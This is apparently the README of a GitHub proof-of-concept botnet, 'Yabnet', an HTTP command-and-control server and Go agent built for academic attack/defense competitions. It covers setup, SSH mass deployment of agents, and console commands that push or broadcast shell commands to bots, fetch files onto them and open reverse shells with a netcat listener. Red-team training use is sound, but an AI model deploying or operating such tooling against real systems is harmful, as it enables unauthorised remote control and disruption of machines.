# Yabnet
Yet Another Botnet, PoC created for educational purposes only.
Yabnet is a HTTP based C2 server and agent that was designed, created, and intended to be used in an academic Attack/Defense competition environment.

From setting up the server, freezing the agent, and distributing the agent to the target machine, yabnet aims to work out-of-the-box. That way, the red teamers could focus on more important stuffs, such as persistence. 

## Disclaimer
Yabnet is a proof of concept tool which was only created for educational purposes in classroom and cybersecurity related competitions. This tool is not created, nor is good enough for any real world usage. I do not condone use of this tool anything other than educational purposes. Using any of the files of yabnet in/against a system that you do not own is illegal, and you will get caught.

## Under Construction - TODO 
-----------

**Yabnet is currently under construction.**
- [x] Dockerize server 
- [x] Create agent in `golang`, instead of using python 
- [ ] Support windows for agent 
- [ ] Clean up debugging codes in all files 
- [ ] Finalize and structure all in-code comments 
- [ ] Enhance README documentation and usage 
- [ ] Support communicating with PWNBOARD 


## Installation 

**Yabnet requires python3.7++ and GOLANG**

**Due to laziness, yabnet currently requires to be installed in the /opt directory.**

Install Golang if it is not installed. 

```
cd /opt
git clone https://github.com/choisg/yabnet.git
cd /opt/yabnet
chmod +x install.sh
./install.sh
```

## Components 

**Server and Agent**

`Server` = Python flask application inside Docker container 
`Agent` = Golang based static executable 

**Utility scripts** 

`/agent/generator.py` = Python script which creates agent golang file with specified server IP address and port number 
`/agent/competition_deployer.py` = Python script which helps to distribute and drops agent file to specific range of IP addresses via SSH

## Installation 

### Server setup - Docker
```
cd /opt/yabnet/server
docker build -t yabnet .
docker run -e USER=<username> -e PASS=<password> -e MASTERKEY=<masterkey> -p 5000:5000 yabnet 

(example docker run -e USER=admin -e PASS=password -e MASTERKEY=masterkey -p 5000:5000 yabnet )
```

### Agent setup - Golang 

Generate the static executable using the `generator.py`
`python3 /opt/yabnet/agent/generator.py -i <serverip> -p <port> -f` 

Verfiy the executable was created 
`file /opt/yabnet/agent/agent`

**Transfer the agent file** 

Transfer `/opt/yabnet/agent/agent` to the target machine and run it.

Feel free to change the name of the executable. 

### Master setup

After server and the agent is setup, launch the master console.
Use the credential that was passed through the `docker run` command for the server. 

```
python3 ./master/master.py
yabnet# login -r localhost -u <user> -p <password>
yabnet# list
``` 

`< All master console commands have help flag>`
`Example) push -h`

## Operation 

The master console has various commands that can be used for controlling the bots. 

**All commands have `-h` help flag**

| Command | Description | Examples | 
| --- | --- | --- |
| login | Login to the server as a master | `login -r 10.0.0.1 -u admin -p password` |
| list | List all currently registered bots | `list` |
| push | Push a command to bot(s) | `push -t <botip>,<botip> -c "cat /etc/passwd | grep backdoor"` | 
| download | Command a bot to download a file from the server | `download -t <botip> -f <server_file> -d <bot_filesystem_destination>` | 
| reverse | Command a bot to start a reverse shell back to server | `reverse -t <botip> -p <server_listening_port>` | 
| broadcast | Push a command to entire bots | `broadcast -c "systemctl stop ssh"` | 
| help | List all possible commands | `help` | 

**Notes** 
1. Specifying multiple targets with `,` comma separator is possible. 
`ex) push -t 10.0.1.1,10.0.2.1,10.0.3.1 -c "systemctl stop apache2"`
2. Reverse shell command requires the master to open a new console and setup a netcat listener. 
`ex) reverse -t 10.0.3.4 -p 31337` 
`ex) nc -lvnp 31337         // And then for the reverse shell from 10.0.3.4` 
3. The server is hosting files in `/opt/yabnet/server/uploads/` directory. 

## Demo
<insert youtubelink here>

## Special Thanks 
[NotoriousRebel](https://github.com/NotoriousRebel) - "Every red teamer should create their own C2"
